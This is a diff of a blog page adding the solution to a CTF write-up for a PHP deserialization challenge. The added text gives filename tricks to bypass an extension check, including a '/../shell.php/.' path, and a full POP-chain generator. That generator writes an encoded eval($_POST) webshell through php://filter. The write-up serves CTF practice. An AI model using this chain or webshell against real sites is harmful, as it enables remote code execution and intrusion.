@@ -505,21 +505,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-22
+                    2021-08-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    316
+                    474
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -542,7 +542,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="刷题笔记-2020-新春红包题-1"><a href="#刷题笔记-2020-新春红包题-1" class="headerlink" title="刷题笔记:[2020 新春红包题]1"></a>刷题笔记:[2020 新春红包题]1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hint1: /?src=1</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hint1: /?src=1</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -670,6 +670,51 @@
     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看了眼代码，这不是和之前那个一样吗。正好再做一遍看会了没。</p>
+<p>具体见<a href="https://syunaht.com/p/286731300.html">刷题笔记:[EIS 2019]EzPOP</a></p>
+<p>不过在这里有不一样的地方：</p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98-1/image-20210824140935138.png"></p>
+<p>所以得绕过</p>
+<p>一开始想的是换个后缀</p>
+<p><strong>php后缀</strong>:php3,php4,php5,phtml,pht</p>
+<p>结果都不能被当做php解析，所以另寻他法：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;..&#x2F;shell.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">class</span>  <span class="token class-name-definition class-name">A</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/../shell.php/."</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"YWFhUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ=="</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"base64_decode"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 
 
                 
